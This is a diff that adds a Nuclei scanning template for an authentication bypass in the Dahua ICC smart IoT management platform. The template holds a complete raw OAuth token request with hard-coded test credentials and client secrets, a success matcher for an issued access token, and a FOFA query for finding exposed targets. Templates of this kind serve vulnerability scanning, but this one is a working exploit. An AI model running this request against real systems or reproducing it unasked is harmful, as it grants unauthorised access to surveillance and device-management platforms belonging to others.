@@ -1,0 +1,30 @@
+id: dahua-icc-oauth
+info:
+  name: 大华智能物联综合管理平台存在逻辑漏洞，可任意用户登录
+  author: xxx
+  severity: high
+  description: |
+    大华ICC智能物联综合管理平台存在逻辑漏洞，可任意用户登录。
+  tags: 2023,dahua
+  metadata:
+    max-request: 2
+    fofa-query: body="*客户端会小于800*"
+    verified: true
+ 
+requests:
+  - raw:
+      - |
+        POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
+        Content-Length: 109
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Connection: close
+ 
+        username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body,"access_token")'
